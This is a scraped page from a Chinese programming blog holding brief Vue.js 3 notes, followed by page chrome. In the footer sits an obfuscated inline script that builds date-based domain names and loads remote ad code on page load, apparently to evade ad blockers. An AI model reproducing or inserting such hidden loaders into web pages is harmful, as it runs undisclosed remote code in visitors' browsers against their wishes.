		Vue.js 3.0 javaScript 相关 Symbol() 是 JavaScript 中的一个原始数据类型，用于创建唯一的、不可变的值。 安装npm install @vue/cli -g 本地node安装vue 工具用于创建项目 命令行输入 vue ui ，根据网址在线创建 ​基础语法 ​语法 1、取值双大括号 {{}} 生命周期 ​组合式API 创建应用 import { createApp } from ‘vue’ ​​import { createApp } from “vue”; import App from “./App.vue”; const app = createApp(App); 挂载 其他组件 router 、store app.use(router).use(store); //最后 app.mount(“#el”); .mount() 方法应该始终在整个应用配置和资源注册完成后被调用。同时请注意，不同于其他资源注册方法，它的返回值是根组件实例而非应用实例。 ​数据和方法 ​function/箭头函数 ​使用箭头函数定义方法时并不会创建函数作用域，因此this也不会指向其父级实例，此时的this会向上追踪。当找到某个函数作用域时，this将指向该函数的父级实例；否则，this将指向浏览器的内置对象Windows。 ​watch更注重于处理数据变化时的业务逻辑，而computed更注重于衍生数据 ​DOM渲染 ​选项优先级 ​选项的优先级 el、template、render三个选项的功能是一致的——获取实例模板（指定或是创建）。然而，当实例同时存在这三个选项时，Vue将如何处理呢？ render&gt;template&gt;el ​封装复用 计算属性 创建一个只读的计算属性 ref： const count = ref(1)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a427bbd563dd25f8cac50d46a77261da/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/123/">«</a>
	<span class="pagination__item pagination__item--current">124/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/125/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>